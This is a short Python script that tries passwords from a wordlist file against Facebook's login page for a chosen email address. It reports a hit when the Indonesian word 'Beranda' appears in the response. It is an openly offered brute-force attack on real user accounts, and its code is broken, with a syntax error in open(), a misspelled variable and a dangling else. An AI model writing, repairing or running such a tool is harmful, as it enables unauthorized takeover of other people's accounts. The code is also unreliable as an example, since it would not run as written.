import requests
import sys

email = raw_input("email_> ")

url='https://free.facebook.com/login.php'
ex =open('pass.txt'. 'r').readlines()

for line in ex:
    paswsword = line.strip()
    http  = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
    content = http.content
    if "Beranda" in content:
       print "[+] password Found ",paswsword 
sys.exit(1)
else:
        print "[!] password invalid ",password 
